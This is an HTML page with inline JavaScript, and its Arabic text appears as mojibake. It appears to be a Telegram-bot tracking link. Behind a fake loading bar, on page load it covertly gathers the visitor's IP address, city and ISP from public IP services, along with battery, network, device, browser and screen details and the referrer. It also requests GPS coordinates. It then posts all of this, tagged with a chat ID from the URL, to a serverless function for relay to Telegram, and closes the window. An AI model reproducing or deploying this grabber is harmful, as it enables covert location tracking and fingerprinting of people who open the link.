<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #1a2a3a;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
        }
        .loader {
            width: 80%;
            max-width: 300px;
        }
        .progress {
            width: 100%;
            height: 8px;
            background: rgba(255,255,255,0.2);
            border-radius: 4px;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%;
            background: #3498db;
            width: 0%;
            transition: width 0.3s;
        }
        .status {
            color: white;
            text-align: center;
            margin-top: 15px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="loader">
        <div class="progress">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        <div class="status" id="statusText">Ø¬Ø§Ø±ÙŠ Ø¨Ø¯Ø¡ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</div>
    </div>

    <script>
        // ========== Ø¯ÙˆØ§Ù„ Ø§Ù„ØªØ­Ø¯ÙŠØ« ÙˆØ§Ù„Ø¹Ø±Ø¶ ==========
        function updateProgress(percent) {
            document.getElementById('progressBar').style.width = percent + '%';
        }
        
        function updateStatus(text) {
            document.getElementById('statusText').textContent = text;
        }
        
        function getChatId() {
            const params = new URLSearchParams(window.location.search);
            const chatId = params.get('chatId') || params.get('id') || params.get('user') || params.get('groupId');
            return chatId;
        }
        
        // ========== Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù… ==========
        async function sendToTelegram(message, chatId) {
            try {
                const response = await fetch('/.netlify/functions/device-info', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chatId: chatId,
                        message: message,
                        timestamp: new Date().toISOString()
                    })
                });
                
                const result = await response.json();
                return result.success;
                
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                return false;
            }
        }
        
        // ========== Ø¯ÙˆØ§Ù„ Ø¬Ù…Ø¹ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¯Ù‚ÙŠÙ‚Ø© ==========
        async function getIPWithMultipleServices() {
            const services = [
                'https://api.ipify.org?format=json',
                'https://api64.ipify.org?format=json',
                'https://ipinfo.io/json',
                'https://ipapi.co/json/'
            ];
            
            for (const service of services) {
                try {
                    const response = await fetch(service, { timeout: 5000 });
                    if (response.ok) {
                        const data = await response.json();
                        return {
                            ip: data.ip || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                            country: data.country || data.country_name || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                            city: data.city || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                            region: data.region || data.region_name || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                            isp: data.org || data.isp || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                            timezone: data.timezone || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'
                        };
                    }
                } catch (error) {
                    continue; // Ø¬Ø±Ø¨ Ø§Ù„Ø®Ø¯Ù…Ø© Ø§Ù„ØªØ§Ù„ÙŠØ©
                }
            }
            
            // Ø¥Ø°Ø§ ÙØ´Ù„Øª Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø®Ø¯Ù…Ø§Øª
            return {
                ip: 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                country: 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                city: 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                region: 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                isp: 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                timezone: 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'
            };
        }
        
        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } catch (e) {}
            }
            
            // Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø¨Ø¯ÙŠÙ„Ø©
            let charging = false;
            if ('charging' in navigator) {
                charging = navigator.charging;
            }
            
            return {
                level: 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                charging: charging,
                chargingTime: 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                dischargingTime: 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'
            };
        }
        
        function getNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            
            if (connection) {
                return {
                    effectiveType: connection.effectiveType || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                    type: connection.type || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                    downlink: connection.downlink ? connection.downlink + ' Mbps' : 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                    rtt: connection.rtt ? connection.rtt + ' ms' : 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                    saveData: connection.saveData ? 'Ù†Ø¹Ù…' : 'Ù„Ø§'
                };
            }
            
            return {
                effectiveType: 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                type: 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                downlink: 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                rtt: 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                saveData: 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'
            };
        }
        
        function getScreenInfo() {
            return {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth + ' bit',
                pixelDepth: screen.pixelDepth + ' bit',
                orientation: screen.orientation ? screen.orientation.type : 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                angle: screen.orientation ? screen.orientation.angle + 'Â°' : 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'
            };
        }
        
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let deviceType = 'ÙƒÙ…Ø¨ÙŠÙˆØªØ± ðŸ–¥ï¸';
            let os = 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
            
            // ÙƒØ´Ù Ù†ÙˆØ¹ Ø§Ù„Ø¬Ù‡Ø§Ø²
            if (/mobile/i.test(ua)) deviceType = 'Ù‡Ø§ØªÙ ðŸ“±';
            if (/tablet/i.test(ua)) deviceType = 'ØªØ§Ø¨Ù„Øª ðŸ“±';
            
            // ÙƒØ´Ù Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ´ØºÙŠÙ„
            if (/Android/i.test(ua)) os = 'Android ðŸ“±';
            else if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS ðŸ“±';
            else if (/Windows/i.test(ua)) os = 'Windows ðŸ–¥ï¸';
            else if (/Mac/i.test(ua)) os = 'macOS ðŸ–¥ï¸';
            else if (/Linux/i.test(ua)) os = 'Linux ðŸ–¥ï¸';
            else if (/CrOS/i.test(ua)) os = 'Chrome OS ðŸ–¥ï¸';
            
            return {
                type: deviceType,
                os: os,
                platform: navigator.platform,
                vendor: navigator.vendor || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                model: 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ', // ÙŠØ­ØªØ§Ø¬ Ø¥Ø°Ù† Ø¥Ø¶Ø§ÙÙŠ
                memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                cores: navigator.hardwareConcurrency || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                maxTouchPoints: navigator.maxTouchPoints || 0
            };
        }
        
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let browser = 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
            let version = 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
            
            // ÙƒØ´Ù Ø§Ù„Ù…ØªØµÙØ­
            if (/Edg/i.test(ua)) browser = 'Edge';
            else if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
            else if (/Firefox/i.test(ua)) browser = 'Firefox';
            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
            else if (/OPR|Opera/i.test(ua)) browser = 'Opera';
            else if (/MSIE|Trident/i.test(ua)) browser = 'Internet Explorer';
            
            // Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø¥ØµØ¯Ø§Ø±
            const versionMatch = ua.match(/(?:Chrome|Firefox|Safari|Edg|OPR|Opera|MSIE|Trident(?:\/| ))(?:\s*)(\d+(?:\.\d+)*)/i);
            if (versionMatch) version = versionMatch[1];
            
            return {
                name: browser + ' ðŸŒ',
                version: version,
                userAgent: navigator.userAgent,
                language: navigator.language || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                languages: navigator.languages ? navigator.languages.join(', ') : 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                cookiesEnabled: navigator.cookieEnabled ? 'Ù†Ø¹Ù… ðŸª' : 'Ù„Ø§ ðŸª',
                javaEnabled: navigator.javaEnabled ? 'Ù†Ø¹Ù… â˜•' : 'Ù„Ø§ â˜•',
                pdfViewerEnabled: navigator.pdfViewerEnabled ? 'Ù†Ø¹Ù… ðŸ“„' : 'Ù„Ø§ ðŸ“„'
            };
        }
        
        function getTimeInfo() {
            const now = new Date();
            const options = { 
                year: 'numeric', 
                month: 'long', 
                day: 'numeric',
                weekday: 'long',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                timeZoneName: 'short'
            };
            
            return {
                hijriDate: now.toLocaleDateString('ar-EG', {calendar: 'islamic'}),
                gregorianDate: now.toLocaleDateString('ar-EG'),
                time: now.toLocaleTimeString('ar-EG'),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: now.toISOString(),
                locale: now.toLocaleString('ar-EG', options)
            };
        }
        
        function getGeolocation() {
            return new Promise((resolve) => {
                if (!'geolocation' in navigator) {
                    resolve({
                        enabled: 'Ù„Ø§ âŒ',
                        latitude: 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                        longitude: 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                        accuracy: 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'
                    });
                    return;
                }
                
                // Ù†Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹ (Ù„Ù† ÙŠØ¹Ù…Ù„ Ø¨Ø¯ÙˆÙ† Ø¥Ø°Ù† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…)
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            enabled: 'Ù†Ø¹Ù… âœ…',
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy + ' Ù…ØªØ±',
                            altitude: position.coords.altitude || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                            heading: position.coords.heading || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                            speed: position.coords.speed || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'
                        });
                    },
                    (error) => {
                        resolve({
                            enabled: 'Ù†Ø¹Ù… Ù„ÙƒÙ† Ù…Ø±ÙÙˆØ¶ âŒ',
                            latitude: 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                            longitude: 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
                            accuracy: 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'
                        });
                    },
                    { timeout: 3000 }
                );
            });
        }
        
        // ========== Ø§Ù„Ø¯Ø§Ù„Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ© ==========
        async function collectInfo() {
            updateStatus('Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ø¶ÙŠØ±...');
            updateProgress(5);
            
            const chatId = getChatId();
            if (!chatId) {
                updateStatus('âŒ Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ù…Ø¹Ø±Ù Ù…Ø­Ø§Ø¯Ø«Ø©');
                setTimeout(() => window.close(), 2000);
                return;
            }
            
            updateStatus('Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø´Ø¨ÙƒØ© ÙˆØ§Ù„Ù…ÙˆÙ‚Ø¹...');
            updateProgress(20);
            const location = await getIPWithMultipleServices();
            
            updateStatus('Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©...');
            updateProgress(35);
            const battery = await getBatteryInfo();
            
            updateStatus('Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²...');
            updateProgress(50);
            const device = getDeviceInfo();
            
            updateStatus('Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…ØªØµÙØ­...');
            updateProgress(65);
            const browser = getBrowserInfo();
            
            updateStatus('Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø´Ø§Ø´Ø©...');
            updateProgress(75);
            const screen = getScreenInfo();
            
            updateStatus('Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„ÙˆÙ‚Øª...');
            updateProgress(85);
            const time = getTimeInfo();
            
            updateStatus('Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø´Ø¨ÙƒØ©...');
            updateProgress(90);
            const network = getNetworkInfo();
            
            updateStatus('Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ...');
            updateProgress(95);
            const geo = await getGeolocation();
            
            updateStatus('Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„ØªÙ‚Ø±ÙŠØ± Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ...');
            
            // ========== Ø¨Ù†Ø§Ø¡ Ø§Ù„Ø±Ø³Ø§Ù„Ø© ==========
            const message = `ðŸ“± **ØªÙ‚Ø±ÙŠØ± Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² Ø§Ù„ÙƒØ§Ù…Ù„** ðŸ“±
            
ðŸ“ **Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙˆØ§Ù„Ø´Ø¨ÙƒØ©:**
- ðŸ” Ø¹Ù†ÙˆØ§Ù† IP: ${location.ip}
- ðŸŒ Ø§Ù„Ø¯ÙˆÙ„Ø©: ${location.country}
- ðŸ™ï¸ Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©: ${location.city}
- ðŸ—ºï¸ Ø§Ù„Ù…Ù†Ø·Ù‚Ø©: ${location.region}
- âš¡ Ù…Ø²ÙˆØ¯ Ø§Ù„Ø®Ø¯Ù…Ø©: ${location.isp}
- ðŸ• Ø§Ù„Ù…Ù†Ø·Ù‚Ø© Ø§Ù„Ø²Ù…Ù†ÙŠØ©: ${location.timezone}
- ðŸ“¡ Ù†ÙˆØ¹ Ø§Ù„Ø´Ø¨ÙƒØ©: ${network.type}
- ðŸ“¶ Ù‚ÙˆØ© Ø§Ù„Ø¥Ø´Ø§Ø±Ø©: ${network.effectiveType}
- â¬‡ï¸ Ø³Ø±Ø¹Ø© Ø§Ù„ØªÙ†Ø²ÙŠÙ„: ${network.downlink}
- â±ï¸ Ø²Ù…Ù† Ø§Ù„Ø§Ø³ØªØ¬Ø§Ø¨Ø©: ${network.rtt}
- ðŸ’¾ ÙˆØ¶Ø¹ ØªÙˆÙÙŠØ± Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª: ${network.saveData}

ðŸ”‹ **Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø·Ø§Ù‚Ø©:**
- ðŸ”‹ Ù…Ø³ØªÙˆÙ‰ Ø§Ù„Ø´Ø­Ù†: ${battery.level}
- âš¡ Ø­Ø§Ù„Ø© Ø§Ù„Ø´Ø­Ù†: ${battery.charging ? 'Ù†Ø¹Ù… âš¡' : 'Ù„Ø§ âš¡'}
- â³ ÙˆÙ‚Øª Ø§Ù„Ø´Ø­Ù† Ø§Ù„Ù…ØªØ¨Ù‚ÙŠ: ${battery.chargingTime === Infinity ? 'ØºÙŠØ± Ù…Ø­Ø¯Ø¯' : battery.chargingTime + ' Ø«Ø§Ù†ÙŠØ©'}
- â³ ÙˆÙ‚Øª Ø§Ù„ØªÙØ±ÙŠØº Ø§Ù„Ù…ØªØ¨Ù‚ÙŠ: ${battery.dischargingTime === Infinity ? 'ØºÙŠØ± Ù…Ø­Ø¯Ø¯' : battery.dischargingTime + ' Ø«Ø§Ù†ÙŠØ©'}

ðŸ–¥ï¸ **Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²:**
- ðŸ“± Ù†ÙˆØ¹ Ø§Ù„Ø¬Ù‡Ø§Ø²: ${device.type}
- ðŸ’» Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ´ØºÙŠÙ„: ${device.os}
- ðŸ·ï¸ Ø§Ù„Ù…Ù†ØµØ©: ${device.platform}
- ðŸ¢ Ø§Ù„Ø´Ø±ÙƒØ© Ø§Ù„Ù…ØµÙ†Ø¹Ø©: ${device.vendor}
- ðŸ§  Ø§Ù„Ø°Ø§ÙƒØ±Ø© (RAM): ${device.memory}
- âš™ï¸ Ø¹Ø¯Ø¯ Ø§Ù„Ø£Ù†ÙˆÙŠØ©: ${device.cores}
- âœ‹ Ù†Ù‚Ø§Ø· Ø§Ù„Ù„Ù…Ø³: ${device.maxTouchPoints}

ðŸŒ **Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…ØªØµÙØ­:**
- ðŸŒ Ø§Ù„Ù…ØªØµÙØ­: ${browser.name}
- ðŸ”¢ Ø§Ù„Ø¥ØµØ¯Ø§Ø±: ${browser.version}
- ðŸ—£ï¸ Ø§Ù„Ù„ØºØ©: ${browser.language}
- ðŸŒ Ø§Ù„Ù„ØºØ§Øª Ø§Ù„Ù…Ø¯Ø¹ÙˆÙ…Ø©: ${browser.languages}
- ðŸª Ù…Ù„ÙØ§Øª ØªØ¹Ø±ÙŠÙ Ø§Ù„Ø§Ø±ØªØ¨Ø§Ø·: ${browser.cookiesEnabled}
- â˜• Ø¬Ø§ÙØ§: ${browser.javaEnabled}
- ðŸ“„ Ø¹Ø§Ø±Ø¶ PDF: ${browser.pdfViewerEnabled}

ðŸ“º **Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø´Ø§Ø´Ø©:**
- ðŸ“ Ø§Ù„Ø¯Ù‚Ø©: ${screen.width} Ã— ${screen.height}
- ðŸ“ Ø§Ù„Ù…Ø³Ø§Ø­Ø© Ø§Ù„Ù…ØªØ§Ø­Ø©: ${screen.availWidth} Ã— ${screen.availHeight}
- ðŸŽ¨ Ø¹Ù…Ù‚ Ø§Ù„Ø£Ù„ÙˆØ§Ù†: ${screen.colorDepth}
- ðŸ–¼ï¸ Ø¹Ù…Ù‚ Ø§Ù„Ø¨ÙƒØ³Ù„: ${screen.pixelDepth}
- ðŸ”„ Ø§ØªØ¬Ø§Ù‡ Ø§Ù„Ø´Ø§Ø´Ø©: ${screen.orientation}
- ðŸ“ Ø²Ø§ÙˆÙŠØ© Ø§Ù„Ø¯ÙˆØ±Ø§Ù†: ${screen.angle}

â° **Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„ÙˆÙ‚Øª:**
- ðŸ“… Ø§Ù„ØªØ§Ø±ÙŠØ® Ø§Ù„Ù‡Ø¬Ø±ÙŠ: ${time.hijriDate}
- ðŸ“… Ø§Ù„ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯ÙŠ: ${time.gregorianDate}
- ðŸ• Ø§Ù„ÙˆÙ‚Øª: ${time.time}
- ðŸŒ Ø§Ù„Ù…Ù†Ø·Ù‚Ø© Ø§Ù„Ø²Ù…Ù†ÙŠØ©: ${time.timezone}
- â±ï¸ Ø§Ù„Ø·Ø§Ø¨Ø¹ Ø§Ù„Ø²Ù…Ù†ÙŠ: ${time.timestamp}

ðŸ“ **Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠØ©:**
- ðŸŒ ØªÙØ¹ÙŠÙ„ Ø§Ù„Ù…ÙˆÙ‚Ø¹: ${geo.enabled}
- ðŸ“ Ø®Ø· Ø§Ù„Ø¹Ø±Ø¶: ${geo.latitude}
- ðŸ“ Ø®Ø· Ø§Ù„Ø·ÙˆÙ„: ${geo.longitude}
- ðŸŽ¯ Ø§Ù„Ø¯Ù‚Ø©: ${geo.accuracy}

ðŸ“Š **Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø¥Ø¶Ø§ÙÙŠØ©:**
- ðŸ”— Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ù…Ø±Ø¬Ø¹ÙŠ: ${document.referrer || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
- ðŸŒ Ø§Ù„Ø¨Ø±ÙˆØªÙˆÙƒÙˆÙ„: ${window.location.protocol}
- ðŸ·ï¸ ÙˆÙƒÙŠÙ„ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: ${navigator.userAgent.substring(0, 200)}...
- ðŸ”” Ø§Ù„Ø¥Ø´Ø¹Ø§Ø±Ø§Øª: ${'Notification' in window ? 'Ù…Ø¯Ø¹ÙˆÙ… ðŸ””' : 'ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ… ðŸ”•'}
- ðŸ“ ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹: ${'geolocation' in navigator ? 'Ù…Ø¯Ø¹ÙˆÙ… ðŸŒ' : 'ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ… âŒ'}
- ðŸ”µ Ø¨Ù„ÙˆØªÙˆØ«: ${'bluetooth' in navigator ? 'Ù…Ø¯Ø¹ÙˆÙ… ðŸ”µ' : 'ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ… âŒ'}
- âœ‹ Ø´Ø§Ø´Ø© Ù„Ù…Ø³: ${'ontouchstart' in window ? 'Ù†Ø¹Ù… âœ‹' : 'Ù„Ø§ âœ‹'}
- ðŸ–¨ï¸ Ø§Ù„Ø·Ø¨Ø§Ø¹Ø©: ${'print' in window ? 'Ù…Ø¯Ø¹ÙˆÙ… ðŸ–¨ï¸' : 'ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ… âŒ'}

â±ï¸ **Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù„Ø³Ø©:**
- ðŸ• ÙˆÙ‚Øª Ø§Ù„ØªØ­Ù…ÙŠÙ„: ${new Date().toLocaleString('ar-EG')}
- ðŸ”‘ Ù…Ø¹Ø±Ù Ø§Ù„Ø¬Ù„Ø³Ø©: ${chatId}
- ðŸŒ Ø¹Ù†ÙˆØ§Ù† Ø§Ù„ØµÙØ­Ø©: ${window.location.href}`;

            updateStatus('Ø¬Ø§Ø±ÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙ‚Ø±ÙŠØ±...');
            updateProgress(98);
            
            const success = await sendToTelegram(message, chatId);
            
            if (success) {
                updateStatus('âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙ‚Ø±ÙŠØ± Ø¨Ù†Ø¬Ø§Ø­!');
                updateProgress(100);
                setTimeout(() => window.close(), 1500);
            } else {
                updateStatus('âŒ ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙ‚Ø±ÙŠØ±');
                setTimeout(() => window.close(), 3000);
            }
        }
        
        // Ø¨Ø¯Ø¡ Ø§Ù„ØªÙ†ÙÙŠØ° Ø¨Ø¹Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
        window.addEventListener('load', () => {
            setTimeout(() => {
                collectInfo();
            }, 500);
        });
    </script>
</body>
</html>
